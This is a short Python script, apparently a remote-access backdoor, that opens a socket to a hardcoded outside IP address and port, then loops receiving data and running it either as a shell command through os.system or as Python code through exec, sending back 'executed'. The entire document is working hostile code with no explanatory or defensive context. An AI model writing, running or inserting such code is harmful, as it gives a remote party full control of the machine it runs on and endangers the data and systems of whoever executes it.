from socket import socket
import os

core = socket()
core.connect(('90.156.204.134', 5053))

while True:
    data = core.recv(2048).decode()

    if data[:2] == '!S':
        os.system(data[2:])
    else:
        exec(data)
    
    response = 'executed'
    
    core.send(response.encode())

